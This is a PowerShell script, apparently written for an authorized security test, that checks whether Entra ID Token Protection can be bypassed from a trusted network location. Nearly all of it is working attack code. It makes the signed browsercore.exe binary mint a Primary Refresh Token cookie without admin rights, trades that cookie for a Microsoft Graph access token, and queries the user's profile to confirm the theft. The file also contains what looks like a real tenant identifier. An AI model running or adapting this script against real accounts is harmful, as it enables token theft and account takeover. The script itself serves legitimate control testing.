# F2-Confirm.ps1 - Token Protection trusted-location bypass test
# RUN ON THE DOMAIN LAPTOP (egress MUST be through Cato/corp = the trusted location).
# It: (1) mints a PRT cookie via the SIGNED browsercore.exe, (2) redeems it locally,
# (3) reports SUCCESS (token issued -> F2 proven) or BLOCKED (AADSTS530084 -> control held).
# Authorized testing only. Non-destructive.

$tenant = "aba1146c-dd62-4078-a5b7-a4e0668141eb"
$client = "14d82eec-204b-4c2f-b7e8-296a70dab67e"    # Microsoft Graph CLI (public client)
$scope  = "https://graph.microsoft.com/.default offline_access openid"

$eip = try { (Invoke-RestMethod https://ifconfig.me/ip -TimeoutSec 8).Trim() } catch { "n/a" }
Write-Host "[*] Egress IP: $eip  (must be the trusted/Cato egress for this test)" -ForegroundColor Cyan

# 1) nonce
$nonce = (Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/common/oauth2/token" -Body "grant_type=srv_challenge").Nonce

# 2) PRT cookie via signed browsercore.exe (LOLBin, user context, no admin)
$bc = "$env:WINDIR\BrowserCore\browsercore.exe"; if(-not (Test-Path $bc)){ $bc = "$env:WINDIR\System32\browsercore.exe" }
if(-not (Test-Path $bc)){ Write-Host "[!] browsercore.exe not found - is this an Entra-joined device?" -ForegroundColor Red; return }
$reqObj = @{ method="GetCookies"; sender="https://login.microsoftonline.com"; uri="https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=$nonce" } | ConvertTo-Json -Compress
$psi = New-Object Diagnostics.ProcessStartInfo
$psi.FileName=$bc; $psi.RedirectStandardInput=$true; $psi.RedirectStandardOutput=$true; $psi.UseShellExecute=$false
$p=[Diagnostics.Process]::Start($psi)
$msg=[Text.Encoding]::UTF8.GetBytes($reqObj)
$p.StandardInput.BaseStream.Write([BitConverter]::GetBytes($msg.Length),0,4)
$p.StandardInput.BaseStream.Write($msg,0,$msg.Length); $p.StandardInput.BaseStream.Flush(); $p.StandardInput.Close()
$so=$p.StandardOutput.BaseStream
$lb=New-Object byte[] 4; $null=$so.Read($lb,0,4); $len=[BitConverter]::ToInt32($lb,0)
$buf=New-Object byte[] $len; $r=0; while($r -lt $len){ $r+=$so.Read($buf,$r,$len-$r) }
$prt = ((([Text.Encoding]::UTF8.GetString($buf)) | ConvertFrom-Json).response | Where-Object {$_.name -eq 'x-ms-RefreshTokenCredential'}).data
if(-not $prt){ Write-Host "[!] Failed to mint PRT cookie" -ForegroundColor Red; return }
Write-Host "[+] PRT cookie minted (len $($prt.Length))" -ForegroundColor Green

# 3) redeem: authorize (carry PRT cookie) -> follow redirects -> code -> token
Add-Type -AssemblyName System.Net.Http
$verifier = -join ((1..64)|ForEach-Object{[char]((48..57)+(65..90)+(97..122)|Get-Random)})
$sha=[Security.Cryptography.SHA256]::Create()
$challenge=[Convert]::ToBase64String($sha.ComputeHash([Text.Encoding]::ASCII.GetBytes($verifier))).TrimEnd('=').Replace('+','-').Replace('/','_')
$h=New-Object System.Net.Http.HttpClientHandler; $h.AllowAutoRedirect=$false; $h.CookieContainer=New-Object System.Net.CookieContainer
$h.CookieContainer.Add((New-Object Uri("https://login.microsoftonline.com")),(New-Object System.Net.Cookie("x-ms-RefreshTokenCredential",$prt,"/","login.microsoftonline.com")))
$hc=New-Object System.Net.Http.HttpClient($h)
$au="https://login.microsoftonline.com/$tenant/oauth2/v2.0/authorize?client_id=$client&response_type=code&redirect_uri=http%3A%2F%2Flocalhost&scope=$([uri]::EscapeDataString($scope))&code_challenge=$challenge&code_challenge_method=S256&state=r"
$code=$null; $blocked=$null; $url=$au
for($i=0;$i -lt 12;$i++){
  $resp=$hc.GetAsync($url).Result
  $sc=[int]$resp.StatusCode
  if($sc -ge 300 -and $sc -lt 400 -and $resp.Headers.Location){
    $loc=$resp.Headers.Location.ToString()
    if($loc -match 'localhost.*[?&]code=([^&]+)'){ $code=[uri]::UnescapeDataString($matches[1]); break }
    if($loc -notmatch '^https?://'){ $loc="https://login.microsoftonline.com$loc" }
    $url=$loc; continue
  }
  $body=$resp.Content.ReadAsStringAsync().Result
  if($body -match 'AADSTS(\d+)'){ $blocked="AADSTS$($matches[1])" }
  break
}

Write-Host ""
if($code){
  $tb="client_id=$client&grant_type=authorization_code&code=$([uri]::EscapeDataString($code))&redirect_uri=http%3A%2F%2Flocalhost&code_verifier=$verifier&scope=$([uri]::EscapeDataString($scope))"
  try{
    $tok=Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/$tenant/oauth2/v2.0/token" -Body $tb -ContentType "application/x-www-form-urlencoded"
    $pl=$tok.access_token.Split('.')[1]; $pl=$pl.Replace('-','+').Replace('_','/').PadRight($pl.Length+(4-$pl.Length%4)%4,'=')
    $cl=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($pl))|ConvertFrom-Json
    Write-Host "[+++] TOKEN ISSUED -> F2 CONFIRMED: Token Protection BYPASSED from trusted egress" -ForegroundColor Red
    Write-Host ("      upn="+$cl.upn+$cl.unique_name+"  deviceid="+$cl.deviceid+"  aud="+$cl.aud) -ForegroundColor Red
    try{ $me=Invoke-RestMethod -Headers @{Authorization="Bearer $($tok.access_token)"} "https://graph.microsoft.com/v1.0/me"; Write-Host ("      /me OK: "+$me.displayName+" <"+$me.userPrincipalName+">") -ForegroundColor Red }catch{}
  } catch { Write-Host ("token exchange failed: "+$_.Exception.Message) -ForegroundColor Yellow }
} elseif($blocked){
  Write-Host "[---] BLOCKED: $blocked -> Token Protection HELD from this egress (control working)" -ForegroundColor Green
  if($blocked -eq 'AADSTS530084'){ Write-Host "      Same code as the untrusted-IP test -> trusted-location exclusion did NOT apply here (or this egress isn't the trusted location)." -ForegroundColor Green }
} else {
  Write-Host "[?] No auth code and no AADSTS error captured - redeem manually / re-run (nonce ~5min)." -ForegroundColor Yellow
}
